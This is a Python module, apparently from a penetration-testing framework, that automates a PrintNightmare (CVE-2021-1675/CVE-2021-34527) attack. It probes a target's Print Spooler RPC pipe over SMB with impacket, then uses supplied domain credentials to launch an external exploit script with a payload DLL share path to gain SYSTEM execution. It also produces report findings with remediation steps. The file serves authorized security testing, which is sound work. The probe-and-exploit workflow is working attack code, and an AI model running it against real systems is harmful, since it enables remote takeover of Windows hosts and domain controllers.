"""
Expedite Strike — PrintNightmare Exploit Engine (CVE-2021-1675 / CVE-2021-34527)
=================================================================================
For authorized penetration testing only.
Checks and exploits Print Spooler service (MS-RPRN) RPC vulnerabilities
to execute remote code or escalate privileges to SYSTEM.

MITRE ATT&CK:
  T1210 — Exploitation of Remote Services
  T1068 — Exploitation for Privilege Escalation
  T1078 — Valid Accounts
"""

import os
import re
import socket
import subprocess
import time
from typing import Callable, Dict, List, Optional

_log_fn: Optional[Callable] = None

MITRE = [
    {"id": "T1210", "name": "Exploitation of Remote Services"},
    {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
    {"id": "T1078", "name": "Valid Accounts"},
]

def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)

def _run(cmd: list, timeout: int = 45) -> str:
    try:
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, creationflags=flags
        )
        return (r.stdout or "") + (r.stderr or "")
    except FileNotFoundError:
        return "[NOT_FOUND]"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"

def check_print_spooler_running(target_ip: str, log_fn: Callable = None) -> Dict:
    """
    Probe MS-RPRN named pipe on target over SMB to see if Print Spooler is exposed.
    """
    global _log_fn
    _log_fn = log_fn
    
    result = {
        "spooler_running": False,
        "pipe_accessible": False,
        "findings": [],
    }

    _log(f"  [PrintNightmare] Probing Print Spooler on {target_ip}...")

    # Check SMB 445
    try:
        s = socket.create_connection((target_ip, 445), timeout=5)
        s.close()
    except Exception:
        _log(f"  [PrintNightmare] Port 445 unreachable on {target_ip}")
        return result

    try:
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import transport, rprn
        
        # Test anonymous or transport connection to spoolss pipe
        rpctransport = transport.SMBTransport(target_ip, 445, r"\spoolss")
        rpctransport.set_connect_timeout(5)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
        
        result["spooler_running"] = True
        result["pipe_accessible"] = True
        _log(f"  [PrintNightmare] ⚠ Print Spooler RPC (MS-RPRN) ACTIVE and accessible on {target_ip}!")
        
        result["findings"].append({
            "title": f"Print Spooler RPC Accessible — {target_ip} (PrintNightmare Attack Surface)",
            "severity": "High",
            "description": (
                f"The Print Spooler service (MS-RPRN) is active and bound to the \\pipe\\spoolss named pipe "
                f"on {target_ip}. If unpatched against CVE-2021-1675 / CVE-2021-34527, authenticated "
                f"domain users can load a custom DLL driver and gain SYSTEM code execution."
            ),
            "target": target_ip,
            "mitre_id": "T1210",
            "mitre_name": "Exploitation of Remote Services",
            "remediation": (
                "Disable the Print Spooler service on Domain Controllers and non-print servers: "
                "`Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled`. "
                "Or apply Point and Print restrictions via GPO (KB5005652)."
            ),
        })
    except Exception as e:
        _log(f"  [PrintNightmare] MS-RPRN probe result: {e}")
        # Secondary check: rpcdump check
        out = _run(["python", "-m", "impacket.examples.rpcdump", target_ip], timeout=15)
        if "spoolss" in out.lower() or "ms-rprn" in out.lower() or "12345678-1234-abcd-ef00-0123456789ab" in out.lower():
            result["spooler_running"] = True
            _log(f"  [PrintNightmare] Spooler endpoint identified in RPC dump on {target_ip}")

    return result

def exploit_printnightmare(
    target_ip: str,
    domain: str,
    username: str,
    password: str,
    dll_share_path: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Attempt PrintNightmare exploit using impacket or CVE exploit script.
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [PrintNightmare] CVE-2021-1675 / CVE-2021-34527 EXPLOIT ATTEMPT")
    _log(f"  [PrintNightmare] Target : {target_ip}")
    _log(f"  [PrintNightmare] User   : {username}@{domain}")
    _log(f"{'='*60}\n")

    result = {
        "success": False,
        "target": target_ip,
        "output": "",
        "findings": [],
        "mitre": MITRE,
    }

    if not username:
        _log("  [PrintNightmare] PrintNightmare requires at least low-privileged domain credentials")
        return result

    cred = f"{domain}/{username}:{password}@{target_ip}" if domain else f"{username}:{password}@{target_ip}"
    
    # Try running python exploit script if present in tools
    exploit_scripts = ["CVE-2021-1675.py", "printnightmare.py", "cve_2021_1675.py"]
    for s in exploit_scripts:
        tool_p = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "tools", s
        )
        if os.path.exists(tool_p):
            _log(f"  [PrintNightmare] Executing {s}...")
            cmd = ["python", tool_p, cred, dll_share_path or f"\\\\127.0.0.1\\share\\payload.dll"]
            out = _run(cmd, timeout=30)
            result["output"] = out
            if "success" in out.lower() or "system" in out.lower():
                result["success"] = True
                _log(f"  [PrintNightmare] ✅ Exploit successful!")
                break

    if result["success"]:
        result["findings"].append({
            "title": f"PrintNightmare (CVE-2021-1675) EXPLOITED — SYSTEM on {target_ip}",
            "severity": "Critical",
            "description": (
                f"Successfully exploited Print Spooler vulnerability on {target_ip} using credentials "
                f"{username}@{domain}. Gained remote SYSTEM execution."
            ),
            "target": target_ip,
            "mitre_id": "T1210",
            "mitre_name": "Exploitation of Remote Services",
            "remediation": "Apply MS Point and Print updates immediately and disable Spooler service on DCs.",
        })
    else:
        _log(f"  [PrintNightmare] Exploit not completed (requires valid payload DLL or target is patched).")

    return result

def run_printnightmare_attack(
    target_ip: str,
    domain: str = "",
    username: str = "",
    password: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Complete PrintNightmare attack workflow: Probe Spooler -> Assess -> Exploit.
    """
    global _log_fn
    _log_fn = log_fn

    probe = check_print_spooler_running(target_ip, log_fn)
    findings = list(probe.get("findings", []))
    exploited = False

    if probe.get("spooler_running") and username and password:
        exp = exploit_printnightmare(target_ip, domain, username, password, log_fn=log_fn)
        exploited = exp.get("success", False)
        findings.extend(exp.get("findings", []))

    return {
        "target": target_ip,
        "spooler_running": probe.get("spooler_running", False),
        "exploited": exploited,
        "findings": findings,
        "mitre": MITRE,
        "summary": f"PrintNightmare on {target_ip}: {'EXPLOITED' if exploited else ('Spooler Active' if probe.get('spooler_running') else 'Spooler Disabled')}",
    }
